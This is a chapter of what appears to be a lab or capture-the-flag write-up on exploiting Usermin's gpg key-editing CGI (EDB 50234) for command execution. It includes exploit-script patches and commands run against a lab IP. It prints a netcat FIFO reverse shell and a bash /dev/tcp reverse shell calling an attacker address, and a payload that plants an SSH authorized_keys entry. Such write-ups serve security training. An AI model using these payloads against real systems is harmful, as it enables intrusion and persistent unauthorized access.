# 04 — Foothold: code execution as cassie

Two ways to fix EDB 50234, and the one that was actually used. The goal is not a shell yet — it is
**proof that a command runs as `cassie`**. Everything after that is file writes.

---

## 4.1 Fix option A — two edits to the published script

The published script has the sink right and the bookkeeping wrong. Two edits are enough
([`scripts/edb-50234-patched.py`](scripts/edb-50234-patched.py)):

**Patch A** — stop trusting the word `successfully`, and keep the key indexes you actually found:

```python
        # [PATCH A] "successfully" is boilerplate -- it is on the page whether or not
        # gpg created anything. Probe the keyring and keep the indexes we found.
        probe = session.post(target + "/gnupg/list_keys.cgi", verify=False)
        check_exp = re.findall(r"edit_key\.cgi\?idx=(\d+)", str(probe.content))
```

**Patch B** — no `[-2]`, and rebuild the query string in the form `edit_key.cgi` expects:

```python
            # [PATCH B] no [-2]: take the last index that actually exists, and
            # rebuild the query string the way edit_key.cgi expects it.
            last_gets_key = "idx={}".format(re.findall(r"edit_key\.cgi\?idx=(\d+)", str(key_list.content))[-1])
```

That is a genuinely minimal diff — the rest of the script, including the `";<payload>echo "` wrapper,
is untouched. It compiles and it will reach the trigger. It still has the original's weak reporting:
if no key exists it prints `[-] An unexpected error occurred`, which tells you nothing about *why*.

## 4.2 Fix option B — the rewrite that was used

[`scripts/exploit_usermin_1820_7f3a.py`](scripts/exploit_usermin_1820_7f3a.py) is the script that
produced the foothold. It keeps the same injection but makes the state visible:

- reads the keyring **before** and **after** key creation, and works on the difference;
- prints the `gpg` error Usermin returned instead of crashing on an index;
- falls back to importing a locally generated key whose UID carries the payload, for boxes where
  `gpg >= 2.3` refuses Usermin's batch stanza;
- `--payload` for an arbitrary command, `--idx` to force a key, `--debug` to dump HTTP bodies.

> **One honest note about the header.** The rewrite's docstring blames the crash on `gpg >= 2.3`
> refusing to create the key. On *this* box creation succeeded — `[+] Key creation returned no
> error` — so the immediate blocker was the `[-2]` index, not the gpg path. Both failures are
> handled by the same script; only one of them happened here.

## 4.3 First run: prove execution, do not ask for a shell

A reverse shell is the wrong first test. If it fails you cannot tell whether the command ran and
egress is filtered, or the command never ran at all. Write a file instead:

```bash
python3 scripts/exploit_usermin_1820_7f3a.py \
  -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1337 \
  --payload 'id > /home/cassie/exec_test.txt 2>&1;'
```

```text
[+] Target https://192.168.161.157:20000
[+] Login successfully
[*] Keys before: [0, 1, 2, 3, 4, 5, 6]
[*] Creating key through secret.cgi
[+] Key creation returned no error
[+] New key index 7
[*] Triggering https://192.168.161.157:20000/gnupg/edit_key.cgi?idx=7
[+] Request returned - command ran in the pipeline
```

`Request returned` is the script's wording, not proof. The proof is the file. Read it back over the
FTP session from chapter 02 — same credentials, no shell needed:

```bash
lftp -u cassie,cassie 192.168.161.157 -e "get exec_test.txt -o /tmp/exec_test.txt; bye"
cat /tmp/exec_test.txt
```

```text
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
```

That single line settles three things at once:

1. The injection fires — this is not a timing artefact or a hopeful `[+]`.
2. It runs as **`cassie`**, so Usermin's per-user CGI model is exactly as expected.
3. The account is in `adm`, which means `/var/log/auth.log` is readable. That becomes decisive in
   chapter 05.

## 4.4 Why the reverse shell did not arrive

The default payload is the usual FIFO shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.158 1337 >/tmp/f;
```

`nc -lvnp 1337` stayed silent, and the HTTP request ended in a `ConnectionError`. That error is
**not** evidence of failure and **not** evidence of success:

- `cat /tmp/f` blocks until something is written to the FIFO, so the shell process stays alive and
  the CGI never returns. A timeout or dropped connection is the expected shape of a *working* FIFO
  payload as well as a broken one.
- If egress to `192.168.45.0/24` is filtered, `nc` hangs too, with the same visible result.

Two ways to disambiguate, in order of cost:

```bash
# 1. no FIFO, no blocking: does a plain callback arrive at all?
python3 scripts/exploit_usermin_1820_7f3a.py -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1377 \
  --payload 'bash -c "bash -i >& /dev/tcp/192.168.45.158/1377 0>&1" &'
```

```bash
# 2. skip the network entirely: does the command run and can it write?
python3 scripts/exploit_usermin_1820_7f3a.py -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1377 \
  --payload 'date > /home/cassie/ts.txt 2>&1; id >> /home/cassie/ts.txt 2>&1;'
```

On this engagement the callback never arrived and the file write always did. The conclusion is
narrow and useful: **the injection works, the outbound path does not.** So the exploit is used as a
file-write primitive, and the shell has to come from a service that speaks *inbound* — SSH.

## 4.5 Turning RCE into a key on disk

With a write primitive as `cassie`, the `authorized_keys` problem from chapter 02 dissolves. Encode
the public key so no shell metacharacter survives the trip through the gpg UID, and write it:

```bash
KEY=$(base64 -w0 ~/.ssh/charlie.pub)
python3 scripts/exploit_usermin_1820_7f3a.py \
  -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1337 \
  --payload "echo $KEY|base64 -d>/home/cassie/.ssh/authorized_keys;"
```

```bash
lftp -u cassie,cassie 192.168.161.157 -e "ls .ssh; bye"
```

```text
-rw-------    1 cassie    cassie          91 Nov 24 22:50 authorized_keys
```

91 bytes, mode `600`, owned by cassie — exactly the length of one `ssh-ed25519` line. The file is
right. Which makes the next chapter's failure genuinely surprising.

## 4.6 What chapter 04 produced

- Confirmed command execution as `cassie` via `/gnupg/edit_key.cgi` → `gpg --fingerprint "<name>"`.
- A working rewrite of EDB 50234, plus a two-edit patch for the original.
- A file-write primitive in `/home/cassie`, including `.ssh/authorized_keys`.
- No reverse shell — egress is not usable, so the interactive shell must come from SSH.
